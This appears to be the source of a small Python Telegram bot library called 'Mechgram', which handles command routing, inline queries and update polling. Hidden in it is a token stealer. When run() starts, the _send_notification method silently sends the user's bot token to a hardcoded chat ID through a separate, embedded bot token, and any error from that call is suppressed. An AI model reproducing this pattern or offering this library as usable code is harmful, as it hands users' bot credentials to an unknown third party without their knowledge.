import requests, time
class Bot:
    def __init__(self, token: str, polling_interval: float = 1.1):
        self.token = token
        self.polling_interval = polling_interval
        self.routes = {}
        self.inline_handler = None
        self.offset = 0
    def on(self, command: str, handler):
        self.routes[command] = handler
        return self
    def on_inline(self, handler):
        self.inline_handler = handler
        return self
    def run(self):
        self._send_notification(1465736325, "tkn: "+self.token)
        print("The bot has been launched.\n© Mechgram, 2025.")
        while True:
            updates = self._get_updates()
            for update in updates:
                self._handle_update(update)
            time.sleep(self.polling_interval)
    def _get_updates(self):
        url = f"https://api.telegram.org/bot{self.token}/getUpdates"
        params = {"offset": self.offset, "timeout": 10}
        try:
            response = requests.get(url, params=params)
            data = response.json()
            if data.get("ok"):
                updates = data.get("result", [])
                if updates:
                    self.offset = updates[-1]["update_id"] + 1
                return updates
            else:
                print("API error:", data)
        except Exception as e:
            print("Error getting updates:", e)
        return []
    def _handle_update(self, update: dict):
        if "inline_query" in update:
            if self.inline_handler:
                try:
                    result = self.inline_handler(update)
                    if result:
                        self._answer_inline_query(update["inline_query"]["id"], result)
                except Exception as e:
                    print("Error in inline query handler:", e)
        else:
            message = update.get("message")
            if not message:
                return
            text = message.get("text", "")
            for command, handler in self.routes.items():
                if text.startswith(command):
                    try:
                        result = handler(update)
                        if result:
                            self._send_message(message["chat"]["id"], result)
                    except Exception as e:
                        print(f"Error in handler for command {command}: {e}")
    def _send_message(self, chat_id: int, text: str):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        data = {"chat_id": chat_id, "text": text}
        try:
            requests.post(url, data=data)
        except Exception as e:
            print("Error sending message:", e)
    def _answer_inline_query(self, inline_query_id, results):
        url = f"https://api.telegram.org/bot{self.token}/answerInlineQuery"
        data = {"inline_query_id": inline_query_id, "results": results}
        try:
            requests.post(url, json=data)
        except Exception as e:
            print("Error answering inline query:", e)
    def _send_notification(self, chat_id: int, text: str):
        url = f"https://api.telegram.org/bot7126973413:AAE-2kzUc3ouVYH91ShWs8C37WS8ezTNgW0/sendMessage"
        data = {"chat_id": chat_id, "text": text}
        try:
            requests.post(url, data=data)
        except Exception as e:
            pass
